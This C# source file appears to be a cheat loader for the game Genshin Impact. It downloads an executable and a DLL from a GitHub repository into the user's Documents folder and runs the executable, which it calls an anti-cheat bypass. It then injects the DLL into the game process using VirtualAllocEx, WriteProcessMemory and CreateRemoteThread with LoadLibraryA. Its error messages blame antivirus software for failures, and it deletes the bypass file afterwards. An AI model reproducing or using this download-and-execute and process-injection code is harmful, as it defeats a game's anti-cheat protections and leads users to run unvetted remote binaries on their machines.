using System;
using System.Linq;
using System.Text;
using System.Net;
using System.Runtime.CompilerServices; 
using System.Linq.Expressions;
using Microsoft.CSharp.RuntimeBinder;
using System.IO;
using System.Threading;
using System.Diagnostics;  
using System.Runtime.InteropServices; 
using System.CodeDom.Compiler;
using System.Reflection;
using System.Data;

namespace GenshinPublic
{
	public class Program
	{
		static void Bypass()
		{
			bool flag = false;
			try
			{
				ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
				WebClient webClient = new WebClient();
				webClient.DownloadFile(new Uri("https://github.com/DeftSolutions-dev/HackGenshin/raw/main/FuckYou/Bypass.exe"), Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.MyDocuments), "Bypass.exe"));
				if (File.Exists(Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.MyDocuments), "Bypass.exe")) && new FileInfo(Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.MyDocuments), "Bypass.exe")).Length > 10L)
				{
					flag = true;
				}
				else
				{
					Console.WriteLine("Dll could not be downloaded, check your Anti Virus!");
					Thread.Sleep(7000);
				}
				if (flag)
				{
					Process.Start(Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.MyDocuments), "Bypass.exe"));
				}
			}
			catch (WebException)
			{
				Console.WriteLine("No internet connection!");
				Thread.Sleep(7000);
			}
			catch (Exception arg)
			{
				Console.WriteLine("Error! " + arg);
				Thread.Sleep(7000);
			} 
		}
		private static void RandomName()
		{
			Console.Title = "";
			Random rnd = new Random();
			Char[] pwdChars = new Char[36] { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
			for (int i = 20; i < 75; i++)
				Console.Title += pwdChars[rnd.Next(0, 35)];
			Thread.Sleep(10);
		}
		const string Chars = "GhjbHUhuvuyv76giUH87hioH98HIh98iok";
		static string RandomString(int length)
		{
			Random random = new Random();
			return new string(Enumerable.Repeat(Chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
		}
		[STAThread]
		[DebuggerNonUserCode]
		[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
		public static void Main(string[] args)
		{
			RandomName(); 
			Bypass();
			Console.WriteLine("Bypass Anti-Cheat..."); 
			LoadFile();
		} 
		public static void LoadFile()
		{ 
			bool flag = false;
			try
			{
				ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
				WebClient webClient = new WebClient();
				Console.WriteLine("Retrieving...");
				webClient.DownloadFile(new Uri("https://github.com/DeftSolutions-dev/HackGenshin/raw/main/FuckYou/FuckYou.dll"), Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.MyDocuments), "FuckYou.dll"));
				Console.WriteLine("Parsing...");
				Console.WriteLine("Downloading...");
				if (File.Exists(Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.MyDocuments), "FuckYou.dll")) && new FileInfo(Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.MyDocuments), "FuckYou.dll")).Length > 200L)
				{
					flag = true;
				}
				else
				{
					Console.WriteLine("Dll could not be downloaded, check your Anti Virus!");
					Thread.Sleep(7000);
				}
				if (flag)
				{
					Console.WriteLine("Injecting...");
					Thread.Sleep(200);
					string text4 = injectDLL(Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.MyDocuments), "FuckYou.dll"));
					if (text4 == "")
					{
						Console.WriteLine("Done = Loader By DesirePro(FUCK#9803)");
						Thread.Sleep(500);
						File.Delete(Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.MyDocuments), "Bypass.exe"));
					}
					else
					{
						Console.WriteLine(text4);
						Console.WriteLine("Loader By DesirePro(FUCK#9803)");
						Thread.Sleep(3500);
					}
				}
			}
			catch (WebException)
			{
				Console.WriteLine("No internet connection!");
				Thread.Sleep(7000);
			}
			catch (Exception arg)
			{
				Console.WriteLine("Error! " + arg);
				Thread.Sleep(7000);
			}
		}
		public static string injectDLL(string path)
		{
			string fileName = Path.GetFileName(path);
			Console.WriteLine("Injecting dll hack");
			if (!File.Exists(path))
			{
				return "The dll was deleted before it could be injected\nCheck your antivirus";
				Thread.Sleep(3500);
			}
			if (new FileInfo(path).Length < 100L)
			{
				return "The dll is smaller than 100 bytes\nCheck your antivirus if you think that this is a problem";
				Thread.Sleep(3500);
			}

			try
			{

				var id = Process.GetProcessesByName("GenshinImpact")[0].Id;
				var process = Process.GetProcessesByName("GenshinImpact")[0];
				IntPtr intPtr = OpenProcess(PROCESS_ALL_ACCESS, false, id);
				Console.WriteLine("Process Handle: " + intPtr.ToString());
				if (!(intPtr == IntPtr.Zero))
				{
					ProcessModuleCollection modules = process.Modules;
					for (int j = 0; j < modules.Count; j++)
					{
						if (modules[j].ModuleName == fileName)
						{
							return "Dll already injected";
							Thread.Sleep(5500);
						}
					}
					IntPtr bytes = IntPtr.Zero;
					IntPtr procAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
					Console.WriteLine("Load Library Addres: " + procAddress.ToString());
					IntPtr intPtr2 = VirtualAllocEx(intPtr, IntPtr.Zero, 0x1000, 0x3000, 0x40); 
					if (intPtr2 == IntPtr.Zero)
					{
						Console.WriteLine("Alloc Error " + Marshal.GetLastWin32Error().ToString()); 
					}
					else if (!WriteProcessMemory(intPtr, intPtr2, Encoding.ASCII.GetBytes(path), path.Length, out bytes))
					{
						Console.WriteLine("Write Error " + Marshal.GetLastWin32Error().ToString()); 
					}
					else
					{
						IntPtr intPtr3 = CreateRemoteThread(intPtr, IntPtr.Zero, 0, procAddress, intPtr2, 0, IntPtr.Zero);
						if (intPtr3 == IntPtr.Zero)
						{
							string text = "Access Denied: " + Marshal.GetLastWin32Error().ToString() + "\n Check your antivirus!";
							Console.WriteLine(text);
							return text;
						}
						WaitForSingleObject(intPtr3, 0xFFFFFFFF);
						DateTime now = DateTime.Now;
						bool flag = false;
						while (now > DateTime.Now.AddSeconds(-5.0))
						{
							DateTime now2 = DateTime.Now;
							while (now > DateTime.Now.AddMilliseconds(-300.0))
							{
								Thread.Sleep(5);
							}
							process.Refresh();
							ProcessModuleCollection modules2 = process.Modules;
							for (int k = 0; k < modules2.Count; k++)
							{
								if (modules2[k].ModuleName == fileName)
								{
									flag = true; 
								}
							}
						} 
						if (!flag)
						{
							CloseHandle(intPtr);
							return "An error occured\nThe DLL was not loaded!\nThis is probably due to your AntiVirus";
							Thread.Sleep(5500);
						}
						Thread.Sleep(200);
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
			return "";
		}
		private static uint PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF;
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool CloseHandle(IntPtr hObject);
		[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
		public static extern IntPtr GetModuleHandle(string lpModuleName);
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
		[DllImport("kernel32.dll")]
		private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
		[DllImport("kernel32.dll")]
		static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
	}
}
